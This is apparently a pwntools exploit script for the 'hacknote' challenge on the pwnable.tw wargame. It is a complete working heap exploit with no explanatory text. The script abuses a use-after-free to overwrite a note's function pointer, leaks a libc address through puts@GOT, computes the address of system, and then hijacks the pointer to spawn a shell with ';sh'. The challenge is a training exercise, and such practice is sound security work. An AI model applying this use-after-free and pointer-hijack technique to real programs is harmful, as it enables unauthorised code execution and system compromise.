from pwn import*
import argparse

context(arch='i386',os='linux')
context.log_level = 'debug'
# -h : option2 
context.terminal = ['tmux','splitw','-v']

parser = argparse.ArgumentParser()
parser.add_argument('-r','--remote',action = 'store_true',help='-r -> remote')
parser.add_argument('-p','--process',action = 'store_true',help='-p -> attach')

args = parser.parse_args()

host = 'chall.pwnable.tw'
port = 10102


elf = ELF('./hacknote')

exit_got = elf.got['exit']
exit_plt = elf.plt['exit']
print_heap = 0x0804862b
puts_got = elf.got['puts']
if args.remote:
    r = remote(host,port)
    libc = ELF('./libc_32.so.6')

elif args.process:
    r = process('./hacknote')
    libc = elf.libc
else:
    breakpoint = {'my_bp':0x08048a43}
    #r = process('./hacknote', env = {'LD_PRELOAD' : './libc_32.so.6'})
    r = process('./hacknote')
    libc = elf.libc
    gdb.attach(r,'b*{}'.format(breakpoint['my_bp']))

def info_bp():
    log.info('program_start : 0x080489ef')
    log.info('Add_input : 0x08048a43')
    log.info('size,content input : ;0x08048a77')
    log.info('my_bp : 0x08048a43')

def add(size,content):
    r.sendlineafter('choice :','1')
    r.sendlineafter('size :',str(size))
    r.sendlineafter('Content :',str(content))

    log.info('add_pause')
    pause()

def delete(index):
    r.sendlineafter('choice :','2')
    r.sendlineafter('Index :',str(index))

    log.info('delete_pause')
    pause()

def p_note(index):
    r.sendlineafter('choice :','3')
    r.sendlineafter('Index :',str(index))

    log.info('print_pause')
    pause()

def exit(index):
    r.sendlineafter('choice :','4')

    log.info('exit_pause')
    pause()
def main():
    add(32,'A'*8)
    add(32,'B'*8)

    delete(0)
    delete(1)

    add(8,p32(print_heap) + p32(puts_got)) 
    
    p_note(0)
    leak = u32(r.recvuntil('\xf7')[-4:])
    log.info('leak = '+hex(leak))
    pause()

    libc_base = leak - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    log.info('libc_base = '+hex(libc_base))
    log.info('system_addr = '+hex(system_addr))
 
    delete(1)

    add(9,p32(system_addr) + ';sh')
    
    p_note(0)
    r.interactive()

if __name__ == '__main__':
    main()
